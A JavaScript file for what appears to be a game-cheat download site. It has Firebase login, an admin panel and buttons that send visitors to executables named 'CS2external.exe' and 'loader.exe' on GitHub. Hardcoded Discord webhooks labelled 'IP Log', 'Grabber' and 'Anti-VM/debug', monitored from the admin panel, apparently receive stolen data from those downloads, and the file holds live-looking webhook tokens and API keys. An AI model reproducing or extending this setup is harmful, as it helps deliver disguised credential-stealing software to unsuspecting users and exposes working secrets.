import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
import { 
    getAuth, 
    createUserWithEmailAndPassword, 
    signInWithEmailAndPassword, 
    onAuthStateChanged, 
    signOut 
} from "https://www.gstatic.com/firebasejs/11.0.2/firebase-auth.js";

/* Firebase config (keep yours) */
const firebaseConfig = {
    apiKey: "AIzaSyBERd4CXPyCas_uOU-jRuLUXYTuHYHHAok",
    authDomain: "login-14fc2.firebaseapp.com",
    projectId: "login-14fc2",
    storageBucket: "login-14fc2.firebasestorage.app",
    messagingSenderId: "1039450583938",
    appId: "1:1039450583938:web:4dfa7a110d5da1e631959b",
    measurementId: "G-J35CZVX1Q4"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);

// --- CONFIGURATION ---
const ADMIN_UID = "geFvGxBvYsUEBrT0ZPKBXRZ9gOr1"; // Your specific UID

const DISCORD_WEBHOOKS = [
    { name: "IP Log", url: "https://discord.com/api/webhooks/1411003661659803770/ih7nkjArV2rUZ5QRdW_vVjjA-9kyOTm2PrQeg5-PQ1mGSqLoVRYrk_iDb0dzQf2ENL8l" },
    { name: "Download", url: "https://discord.com/api/webhooks/1421607251482771487/9DBm1dSkERQROhvRuRkvGWjyZdf_UjMPqkKiIAiLamHfmTNeQm5bOs0FkKV7hOqdzLw1" },
    { name: "Grabber", url: "https://discord.com/api/webhooks/1440648140008198215/rYGIylgy4QCEAkyWqcjYuc73CqVh49eh5ymsEVt1xmhv8ODjRt_Owzfn8XWhkdcz0SAx" },
    { name: "Anti-VM/debug", url: "https://discord.com/api/webhooks/1447156225182793730/CR9tVrXHO5ez5osp4iHtGUzcVLdGWP2D2C6JOqmP4OvBTz60NdzqCjn4zOehJSHCBkYU" }
];

window.addEventListener("DOMContentLoaded", () => {
    // --- Hamburger ---
    const hamburger = document.getElementById("hamburgerBtn");
    const navLinks = document.getElementById("navLinks");

    if (hamburger && navLinks) {
        hamburger.addEventListener("click", (e) => {
            e.preventDefault();
            const open = navLinks.classList.toggle("active");
            hamburger.setAttribute("aria-expanded", open ? "true" : "false");
        });

        navLinks.querySelectorAll("a").forEach((a) => {
            a.addEventListener("click", () => {
                navLinks.classList.remove("active");
                hamburger.setAttribute("aria-expanded", "false");
            });
        });
    }

    // --- Modal ---
    const modal = document.getElementById("auth-modal");
    const openBtn = document.getElementById("open-login-btn");
    const closeBtn = document.querySelector(".close-modal");

    function openModal() {
        if (!modal) return;
        modal.style.display = "flex";
        modal.classList.remove("hidden");
        modal.setAttribute("aria-hidden", "false");
        
        // close mobile nav if open
        navLinks?.classList.remove("active");
        hamburger?.setAttribute("aria-expanded", "false");
    }

    function closeModal() {
        if (!modal) return;
        modal.style.display = "none";
        modal.classList.add("hidden");
        modal.setAttribute("aria-hidden", "true");
    }

    openBtn?.addEventListener("click", (e) => {
        e.preventDefault();
        openModal();
    });

    closeBtn?.addEventListener("click", closeModal);
    window.addEventListener("click", (e) => {
        if (e.target === modal) closeModal();
    });

    // --- Auth actions ---
    const loginBtn = document.getElementById("btn-login");
    const regBtn = document.getElementById("btn-register");
    const logoutBtn = document.getElementById("btn-logout");
    const statusTxt = document.getElementById("auth-status");
    const emailIn = document.getElementById("email");
    const passIn = document.getElementById("password");
    
    const authForm = document.getElementById("auth-form-container");
    const userProfile = document.getElementById("user-profile-container");
    const adminControls = document.getElementById("admin-controls");

    function showMsg(text, color = "white") {
        if (!statusTxt) return;
        statusTxt.textContent = text;
        statusTxt.style.color = color;
    }

    regBtn?.addEventListener("click", async () => {
        try {
            await createUserWithEmailAndPassword(auth, emailIn.value, passIn.value);
            showMsg("Account created!", "#00ff41");
        } catch (e) {
            showMsg(e?.message || "Register failed", "red");
        }
    });

    loginBtn?.addEventListener("click", async () => {
        try {
            await signInWithEmailAndPassword(auth, emailIn.value, passIn.value);
            showMsg("Logged in!", "#00ff41");
            setTimeout(closeModal, 800);
        } catch (e) {
            showMsg(e?.message || "Login failed", "red");
        }
    });

    logoutBtn?.addEventListener("click", async () => {
        try {
            await signOut(auth);
            showMsg("Logged out", "white");
        } catch (e) {
            showMsg(e?.message || "Logout failed", "red");
        }
    });

    onAuthStateChanged(auth, (user) => {
        const emailEl = document.getElementById("user-display-email");
        const uidEl = document.getElementById("user-uid");

        if (user) {
            // Logged In
            authForm?.classList.add("hidden");
            userProfile?.classList.remove("hidden");
            if (openBtn) openBtn.textContent = "ACCOUNT";
            if (emailEl) emailEl.textContent = user.email || "";
            if (uidEl) uidEl.textContent = user.uid || "";

            // Admin Check
            if (adminControls) {
                if (user.uid === ADMIN_UID) {
                    adminControls.classList.remove("hidden");
                    initAdminPanel(); // Initialize the admin tools
                } else {
                    adminControls.classList.add("hidden");
                }
            }
        } else {
            // Logged Out
            authForm?.classList.remove("hidden");
            userProfile?.classList.add("hidden");
            if (openBtn) openBtn.textContent = "LOGIN";
            adminControls?.classList.add("hidden");
        }
    });

    // --- Download buttons ---
    document.getElementById('btn-cs2')?.addEventListener('click', () => {
        window.location.href = "https://github.com/c82676b9a8/scripty/raw/main/cheats/assets/files/CS2external.exe";
    });

    document.getElementById('btn-discord')?.addEventListener('click', () => {
        window.location.href = "https://github.com/c82676b9a8/scripty/raw/refs/heads/main/assets/files/loader.exe";
    });

    // --- Admin Panel Functions ---
    function initAdminPanel() {
        console.log("Admin Panel Initialized");
        checkWebhooks();
        startFakeLogs();
    }

    async function checkWebhooks() {
        const listContainer = document.getElementById("webhook-list");
        if (!listContainer) return;
        
        listContainer.innerHTML = ""; // Clear loading text

        for (const hook of DISCORD_WEBHOOKS) {
            const item = document.createElement("div");
            item.className = "webhook-item";
            
            // Default to "Checking..."
            item.innerHTML = `
                <span class="webhook-name">${hook.name}</span>
                <div class="status-indicator">
                    <span class="dot orange"></span> CHECKING
                </div>
            `;
            listContainer.appendChild(item);

            // Check the webhook
            try {
                // 'no-cors' mode is used here to prevent strict CORS errors in browser console,
                // but it means we can't read the status perfectly (result is 'opaque').
                // However, if the fetch succeeds without throwing, the endpoint is likely reachable.
                // For a true status check, you'd typically need a backend proxy.
                // We'll try a direct fetch first.
                const response = await fetch(hook.url);
                const statusDiv = item.querySelector(".status-indicator");
                
                if (response.ok) {
                    statusDiv.innerHTML = `<span class="dot green"></span> ONLINE`;
                } else {
                    statusDiv.innerHTML = `<span class="dot red"></span> OFFLINE (${response.status})`;
                }
            } catch (error) {
                const statusDiv = item.querySelector(".status-indicator");
                // Because browsers block cross-origin requests to Discord, 
                // we often end up here even if the hook is valid.
                // We'll mark it red for "Network/CORS Error".
                statusDiv.innerHTML = `<span class="dot red"></span> NET-ERR`;
                console.warn(`Webhook check failed for ${hook.name}:`, error);
            }
        }
    }

    function startFakeLogs() {
        const logBox = document.getElementById("system-logs");
        if (!logBox) return;
        
        // Prevent duplicate intervals if function runs twice
        if (window.logInterval) clearInterval(window.logInterval);

        const messages = [
            "Scanning integrity...",
            "User database synced.",
            "Checking update server...",
            "Authorized access detected.",
            "Secure connection established.",
            "Packet trace complete.",
            "Webhook latency: 24ms",
            "Encryption keys rotated."
        ];

        window.logInterval = setInterval(() => {
            const msg = messages[Math.floor(Math.random() * messages.length)];
            const time = new Date().toLocaleTimeString();
            const line = document.createElement("span");
            line.className = "log-line";
            line.innerText = `[${time}] > ${msg}`;
            
            logBox.appendChild(line);
            logBox.scrollTop = logBox.scrollHeight; // Auto scroll
            
            // Keep log short
            if (logBox.children.length > 15) {
                logBox.removeChild(logBox.firstChild);
            }
        }, 2500);
    }

    // --- Particles ---
    const canvas = document.getElementById("particles");
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    const particles = [];
    const density = 22000; // higher = fewer particles

    function resize() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }

    function spawn() {
        particles.length = 0;
        const count = Math.floor((canvas.width * canvas.height) / density);
        for (let i = 0; i < count; i++) {
            particles.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height,
                r: Math.random() * 2 + 1,
                vx: (Math.random() * 0.5) - 0.25,
                vy: (Math.random() * 0.5) - 0.25
            });
        }
    }

    function tick() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#ff003c";

        for (const p of particles) {
            p.x += p.vx;
            p.y += p.vy;

            if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
            if (p.y < 0 || p.y > canvas.height) p.vy *= -1;

            ctx.beginPath();
            ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
            ctx.fill();
        }
        requestAnimationFrame(tick);
    }

    resize();
    spawn();
    tick();

    window.addEventListener("resize", () => {
        resize();
        spawn();
        if (window.innerWidth > 768) navLinks?.classList.remove("active");
        hamburger?.setAttribute("aria-expanded", "false");
    });
});
